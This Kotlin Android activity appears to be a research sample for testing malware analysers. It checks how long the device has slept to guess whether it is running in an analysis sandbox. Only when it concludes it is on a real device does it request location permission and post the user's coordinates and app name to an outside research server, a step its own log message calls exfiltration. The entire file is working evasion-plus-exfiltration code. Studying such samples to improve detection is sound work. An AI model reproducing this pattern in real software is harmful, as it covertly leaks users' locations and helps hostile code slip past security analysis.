package nl.tbethe.shadowdroid.sleeptime

import android.Manifest
import android.content.pm.PackageManager
import android.location.Criteria
import android.location.LocationManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.SystemClock
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.request.forms.*
import io.ktor.client.statement.*
import io.ktor.http.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

private const val TAG = "MainActivity"

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val uptimeWithSleep = SystemClock.elapsedRealtime()
        val uptimeWithoutSleep = SystemClock.uptimeMillis()
        val sleepTimeMillis = uptimeWithSleep - uptimeWithoutSleep

        // 2 hours = 1_000 * 60 * 60 * 2 = 7_200_000 milliseconds
        val twoHourMillis : Long = 7_200_000

        leakLocationIf (sleepTimeMillis > twoHourMillis)
    }

    private fun leakLocationIf(notAnalyser: Boolean) {
        if (!notAnalyser) return

        fun sendLocation() {
            val lm = getSystemService(LocationManager::class.java)
            val provider = lm.getBestProvider(Criteria(), true)

            val location = provider?.let {
                lm.getLastKnownLocation(it)
            }
            location?.let { loc ->
                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak?appname="
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        HttpClient(CIO).use { client ->
                            val response = client.submitForm<HttpResponse>(
                                url,
                                Parameters.build {
                                    append("appname", packageName)
                                    append("coords", "${loc.latitude}:${loc.longitude}")
                                },
                                false
                            )
                            Log.d(TAG, "Response status: ${response.status}")
                            Log.d(TAG, "Response: ${response.readText()}")
                        }
                    } catch (e: Exception) {
                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
                    }
                }
            }
        }
        val requestPermission =
            registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
                if (isGranted) sendLocation()
            }
        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            PackageManager.PERMISSION_DENIED -> {
                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
            }
            PackageManager.PERMISSION_GRANTED -> {
                sendLocation()
            }
        }
    }
}